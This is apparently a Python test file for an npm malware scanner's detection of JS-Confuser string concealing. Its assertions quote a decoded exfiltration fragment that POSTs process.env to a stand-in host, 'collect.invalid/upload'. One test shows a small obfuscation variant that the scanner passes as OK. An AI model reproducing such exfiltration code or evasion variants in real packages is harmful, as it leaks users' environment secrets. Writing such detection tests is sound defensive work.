"""D-11 (0.1.9): JS-Confuser's string concealing read in the decoded view. JS-Confuser 2 replaces each string of
three characters or more with `F(start, length)`, a slice of one long string decoded with base91 over an alphabet
each decoder shuffles; the decoded view writes each call as its string (the engine's `jcstr.rs`). Before it, an
obfuscated exfiltration hid `request`, `env` and its host, and its release was OK. Code built around it is a sign
of its own (rule set 2.78.0, John: "seems like we would want that to be Critical"), as a string array is:
CRITICAL at install, a strong reason at import.

The fixtures (tests/fixtures/js_confuser, its README) are an inert script and what JS-Confuser 2.1.3 wrote for it:
hosts are .invalid, and nothing is installed or run."""
import os
import unittest

from lazaret.scanner import core
from tests.registry._review_support import issues, manifest, scan_npm

FIXTURES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "fixtures", "js_confuser")
DECODED = "(in strings it decodes as it runs)"
TECHNIQUE = "hides its strings in one long string it decodes as it runs (JS-Confuser's string concealing)"


def fixture(name):
    with open(os.path.join(FIXTURES, name), encoding="utf-8") as f:
        return f.read()


def import_risks(text):
    res = scan_npm({"package.json": manifest(main="index.js"), "index.js": text})
    return res, [(i["sev"], i["msg"]) for i in issues(res, "SC-IMPORT-RISK")]


class DecodedViewTests(unittest.TestCase):
    def test_each_call_is_its_string(self):
        for name in ("string-concealing.js", "preset-low.js"):
            with self.subTest(name=name):
                view = core.decoded_view(fixture(name), "js")
                self.assertIn(".request({['hostname']:'collect.invalid',['path']:'/upload',['method']:'POST'})", view)
                self.assertIn("JSON.stringify({['host']:", view)
                self.assertIn("['env']:process.env}", view)

    def test_a_decoder_in_a_function(self):
        view = core.decoded_view(fixture("benign-string-concealing.js"), "js")
        self.assertIn("return 'Hello, '+name+', from '+path.basename(__filename)+\".\"", view)

    def test_python_is_not_read(self):
        text = fixture("string-concealing.js")
        self.assertNotIn("'collect.invalid'", core.decoded_view(text, "py"))


class VerdictTests(unittest.TestCase):
    def test_the_concealed_exfiltration(self):
        for name in ("string-concealing.js", "preset-low.js"):
            with self.subTest(name=name):
                res, found = import_risks(fixture(name))
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
                self.assertEqual([sev for sev, _msg in found], ["CRITICAL"], found)
                self.assertIn(DECODED, found[0][1])
                self.assertIn(TECHNIQUE, found[0][1])

    def test_a_retriever_not_read_is_as_before(self):
        # (its sum the other way round is read too; a slice to the length alone is not JS-Confuser's)
        text = fixture("string-concealing.js").replace('["slice"](start,start+length)', '["slice"](start,length)')
        res, found = import_risks(text)
        self.assertEqual((res["verdict"], found), ("OK", []))

    def test_a_concealed_greeting_is_the_technique_alone(self):
        res, found = import_risks(fixture("benign-string-concealing.js"))
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertEqual(found, [("CRITICAL", f"index.js runs when the package is loaded, and it {TECHNIQUE}.")])

    def test_at_install(self):
        res = scan_npm({"package.json": manifest(scripts={"postinstall": "node setup.js"}),
                        "setup.js": fixture("benign-string-concealing.js")})
        hooks = [(i["sev"], i["msg"]) for i in issues(res, "SC-INSTALL-HOOK")]
        self.assertIn(("CRITICAL", f"Install hook runs setup.js, which {TECHNIQUE}."), hooks)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])


if __name__ == "__main__":
    unittest.main()
